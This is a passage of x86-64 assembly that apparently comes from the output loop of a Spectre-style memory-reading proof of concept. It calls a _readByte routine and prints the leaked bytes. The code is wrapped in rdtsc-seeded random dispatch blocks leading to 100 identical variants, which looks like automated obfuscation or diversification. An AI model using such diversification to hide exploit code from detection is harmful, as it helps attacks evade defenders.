	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 95
.Lmain_win2_var95:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 96
.Lmain_win2_var96:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 97
.Lmain_win2_var97:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 98
.Lmain_win2_var98:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
## Variant 99
.Lmain_win2_var99:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	jmp	.Lmain_win2_continue
.Lmain_win2_continue:
	movb	$0, %al
	callq	_printf
	movq	-48(%rbp), %rdi
	movq	%rdi, %rax
	addq	$1, %rax
	movq	%rax, -48(%rbp)
	leaq	-34(%rbp), %rsi
	leaq	-16(%rbp), %rdx
	callq	_readByte
	movl	-16(%rbp), %ecx
	movl	-12(%rbp), %edx
	shll	%edx
	leaq	L_.str.7(%rip), %rsi
	leaq	L_.str.6(%rip), %rax
	cmpl	%edx, %ecx
	cmovgeq	%rax, %rsi
	leaq	L_.str.5(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movsbl	-34(%rbp), %eax
	movl	%eax, -52(%rbp)    # # 4-byte Spill
	movsbl	-34(%rbp), %eax
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win1_var0
	cmpl	$1, %eax
	je	.Lmain_win1_var1
	cmpl	$2, %eax
	je	.Lmain_win1_var2
	cmpl	$3, %eax
	je	.Lmain_win1_var3
	cmpl	$4, %eax
	je	.Lmain_win1_var4
	cmpl	$5, %eax
	je	.Lmain_win1_var5
	cmpl	$6, %eax
	je	.Lmain_win1_var6
	cmpl	$7, %eax
	je	.Lmain_win1_var7
	cmpl	$8, %eax
	je	.Lmain_win1_var8
	cmpl	$9, %eax
	je	.Lmain_win1_var9
	cmpl	$10, %eax
	je	.Lmain_win1_var10
	cmpl	$11, %eax
	je	.Lmain_win1_var11
	cmpl	$12, %eax
	je	.Lmain_win1_var12
	cmpl	$13, %eax
	je	.Lmain_win1_var13
	cmpl	$14, %eax
	je	.Lmain_win1_var14
	cmpl	$15, %eax
	je	.Lmain_win1_var15
	cmpl	$16, %eax
	je	.Lmain_win1_var16
	cmpl	$17, %eax
	je	.Lmain_win1_var17
	cmpl	$18, %eax
	je	.Lmain_win1_var18
	cmpl	$19, %eax
	je	.Lmain_win1_var19
	cmpl	$20, %eax
	je	.Lmain_win1_var20
	cmpl	$21, %eax
	je	.Lmain_win1_var21
	cmpl	$22, %eax
	je	.Lmain_win1_var22
	cmpl	$23, %eax
	je	.Lmain_win1_var23
	cmpl	$24, %eax
	je	.Lmain_win1_var24
	cmpl	$25, %eax
	je	.Lmain_win1_var25
	cmpl	$26, %eax
	je	.Lmain_win1_var26
	cmpl	$27, %eax
	je	.Lmain_win1_var27
	cmpl	$28, %eax
	je	.Lmain_win1_var28
	cmpl	$29, %eax
	je	.Lmain_win1_var29
	cmpl	$30, %eax
	je	.Lmain_win1_var30
	cmpl	$31, %eax
	je	.Lmain_win1_var31
	cmpl	$32, %eax
	je	.Lmain_win1_var32
	cmpl	$33, %eax
	je	.Lmain_win1_var33
	cmpl	$34, %eax
	je	.Lmain_win1_var34
	cmpl	$35, %eax
	je	.Lmain_win1_var35
	cmpl	$36, %eax
	je	.Lmain_win1_var36
	cmpl	$37, %eax
	je	.Lmain_win1_var37
	cmpl	$38, %eax
	je	.Lmain_win1_var38
	cmpl	$39, %eax
	je	.Lmain_win1_var39
	cmpl	$40, %eax
	je	.Lmain_win1_var40
	cmpl	$41, %eax
	je	.Lmain_win1_var41
	cmpl	$42, %eax
	je	.Lmain_win1_var42
	cmpl	$43, %eax
	je	.Lmain_win1_var43
	cmpl	$44, %eax
	je	.Lmain_win1_var44
	cmpl	$45, %eax
	je	.Lmain_win1_var45
	cmpl	$46, %eax
	je	.Lmain_win1_var46
	cmpl	$47, %eax
	je	.Lmain_win1_var47
	cmpl	$48, %eax
	je	.Lmain_win1_var48
	cmpl	$49, %eax
	je	.Lmain_win1_var49
	cmpl	$50, %eax
	je	.Lmain_win1_var50
	cmpl	$51, %eax
	je	.Lmain_win1_var51
	cmpl	$52, %eax
	je	.Lmain_win1_var52
	cmpl	$53, %eax
	je	.Lmain_win1_var53
	cmpl	$54, %eax
	je	.Lmain_win1_var54
	cmpl	$55, %eax
	je	.Lmain_win1_var55
	cmpl	$56, %eax
	je	.Lmain_win1_var56
	cmpl	$57, %eax
	je	.Lmain_win1_var57
	cmpl	$58, %eax
	je	.Lmain_win1_var58
	cmpl	$59, %eax
	je	.Lmain_win1_var59
	cmpl	$60, %eax
	je	.Lmain_win1_var60
	cmpl	$61, %eax
	je	.Lmain_win1_var61
	cmpl	$62, %eax
	je	.Lmain_win1_var62
	cmpl	$63, %eax
	je	.Lmain_win1_var63
	cmpl	$64, %eax
	je	.Lmain_win1_var64
	cmpl	$65, %eax
	je	.Lmain_win1_var65
	cmpl	$66, %eax
	je	.Lmain_win1_var66
	cmpl	$67, %eax
	je	.Lmain_win1_var67
	cmpl	$68, %eax
	je	.Lmain_win1_var68
	cmpl	$69, %eax
	je	.Lmain_win1_var69
	cmpl	$70, %eax
	je	.Lmain_win1_var70
	cmpl	$71, %eax
	je	.Lmain_win1_var71
	cmpl	$72, %eax
	je	.Lmain_win1_var72
	cmpl	$73, %eax
	je	.Lmain_win1_var73
	cmpl	$74, %eax
	je	.Lmain_win1_var74
	cmpl	$75, %eax
	je	.Lmain_win1_var75
	cmpl	$76, %eax
	je	.Lmain_win1_var76
	cmpl	$77, %eax
	je	.Lmain_win1_var77
	cmpl	$78, %eax
	je	.Lmain_win1_var78
	cmpl	$79, %eax
	je	.Lmain_win1_var79
	cmpl	$80, %eax
	je	.Lmain_win1_var80
	cmpl	$81, %eax
	je	.Lmain_win1_var81
	cmpl	$82, %eax
	je	.Lmain_win1_var82
	cmpl	$83, %eax
	je	.Lmain_win1_var83
	cmpl	$84, %eax
	je	.Lmain_win1_var84
	cmpl	$85, %eax
	je	.Lmain_win1_var85
	cmpl	$86, %eax
	je	.Lmain_win1_var86
	cmpl	$87, %eax
	je	.Lmain_win1_var87
	cmpl	$88, %eax
	je	.Lmain_win1_var88
	cmpl	$89, %eax
	je	.Lmain_win1_var89
	cmpl	$90, %eax
	je	.Lmain_win1_var90
	cmpl	$91, %eax
	je	.Lmain_win1_var91
	cmpl	$92, %eax
	je	.Lmain_win1_var92
	cmpl	$93, %eax
	je	.Lmain_win1_var93
	cmpl	$94, %eax
	je	.Lmain_win1_var94
	cmpl	$95, %eax
	je	.Lmain_win1_var95
	cmpl	$96, %eax
	je	.Lmain_win1_var96
	cmpl	$97, %eax
	je	.Lmain_win1_var97
	cmpl	$98, %eax
	je	.Lmain_win1_var98
	cmpl	$99, %eax
	je	.Lmain_win1_var99
	jmp	.Lmain_win1_var0
## Variant 0
.Lmain_win1_var0:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 1
.Lmain_win1_var1:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 2
.Lmain_win1_var2:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 3
.Lmain_win1_var3:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 4
.Lmain_win1_var4:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 5
.Lmain_win1_var5:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 6
.Lmain_win1_var6:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 7
.Lmain_win1_var7:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 8
.Lmain_win1_var8:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 9
.Lmain_win1_var9:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 10
.Lmain_win1_var10:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 11
.Lmain_win1_var11:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 12
.Lmain_win1_var12:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 13
.Lmain_win1_var13:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 14
.Lmain_win1_var14:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 15
.Lmain_win1_var15:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 16
.Lmain_win1_var16:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 17
.Lmain_win1_var17:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 18
.Lmain_win1_var18:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 19
.Lmain_win1_var19:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 20
.Lmain_win1_var20:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 21
.Lmain_win1_var21:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 22
.Lmain_win1_var22:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 23
.Lmain_win1_var23:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 24
.Lmain_win1_var24:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 25
.Lmain_win1_var25:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 26
.Lmain_win1_var26:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 27
.Lmain_win1_var27:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 28
.Lmain_win1_var28:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 29
.Lmain_win1_var29:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 30
.Lmain_win1_var30:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 31
.Lmain_win1_var31:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 32
.Lmain_win1_var32:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 33
.Lmain_win1_var33:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 34
.Lmain_win1_var34:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 35
.Lmain_win1_var35:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 36
.Lmain_win1_var36:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 37
.Lmain_win1_var37:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 38
.Lmain_win1_var38:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 39
.Lmain_win1_var39:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 40
.Lmain_win1_var40:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 41
.Lmain_win1_var41:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 42
.Lmain_win1_var42:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 43
.Lmain_win1_var43:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 44
.Lmain_win1_var44:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 45
.Lmain_win1_var45:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 46
.Lmain_win1_var46:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 47
.Lmain_win1_var47:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 48
.Lmain_win1_var48:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 49
.Lmain_win1_var49:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 50
.Lmain_win1_var50:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 51
.Lmain_win1_var51:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 52
.Lmain_win1_var52:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 53
.Lmain_win1_var53:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 54
.Lmain_win1_var54:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 55
.Lmain_win1_var55:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 56
.Lmain_win1_var56:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 57
.Lmain_win1_var57:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 58
.Lmain_win1_var58:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 59
.Lmain_win1_var59:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 60
.Lmain_win1_var60:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 61
.Lmain_win1_var61:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 62
.Lmain_win1_var62:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 63
.Lmain_win1_var63:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 64
.Lmain_win1_var64:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 65
.Lmain_win1_var65:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 66
.Lmain_win1_var66:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 67
.Lmain_win1_var67:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 68
.Lmain_win1_var68:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 69
.Lmain_win1_var69:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 70
.Lmain_win1_var70:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 71
.Lmain_win1_var71:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 72
.Lmain_win1_var72:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 73
.Lmain_win1_var73:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 74
.Lmain_win1_var74:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 75
.Lmain_win1_var75:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 76
.Lmain_win1_var76:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 77
.Lmain_win1_var77:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 78
.Lmain_win1_var78:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 79
.Lmain_win1_var79:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 80
.Lmain_win1_var80:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 81
.Lmain_win1_var81:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 82
.Lmain_win1_var82:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 83
.Lmain_win1_var83:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 84
.Lmain_win1_var84:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 85
.Lmain_win1_var85:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 86
.Lmain_win1_var86:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 87
.Lmain_win1_var87:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 88
.Lmain_win1_var88:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 89
.Lmain_win1_var89:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 90
.Lmain_win1_var90:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 91
.Lmain_win1_var91:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 92
